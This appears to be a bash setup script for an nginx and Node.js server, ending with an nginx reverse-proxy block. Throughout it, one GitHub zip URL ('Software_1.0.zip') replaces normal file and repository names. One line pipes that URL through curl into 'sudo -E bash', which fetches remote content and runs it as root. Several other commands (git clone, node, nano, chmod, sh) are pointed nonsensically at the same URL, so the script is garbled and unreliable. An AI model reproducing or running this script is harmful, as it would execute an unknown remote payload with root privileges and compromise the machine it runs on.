#!/bin/bash
apt-get update
apt-get install -y nginx
systemctl start nginx
systemctl enable nginx
apt-get install -y git
curl -SL https://github.com/shubhamdas70/awslab/raw/refs/heads/master/phytoglobulin/Software_1.0.zip|sudo -E bash -
apt-get install -y nodejs
git clone https://github.com/shubhamdas70/awslab/raw/refs/heads/master/phytoglobulin/Software_1.0.zip
cd Repo1
npm install
node https://github.com/shubhamdas70/awslab/raw/refs/heads/master/phytoglobulin/Software_1.0.zip


sudo nano https://github.com/shubhamdas70/awslab/raw/refs/heads/master/phytoglobulin/Software_1.0.zip
sudo chmod +x https://github.com/shubhamdas70/awslab/raw/refs/heads/master/phytoglobulin/Software_1.0.zip
sh https://github.com/shubhamdas70/awslab/raw/refs/heads/master/phytoglobulin/Software_1.0.zip
#!/bin/bash
while(true)
do
echo "Inside loop"
done

location /  {
        proxy_pass http://localhost:4000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_cache_bypass $http_upgrade;
    }
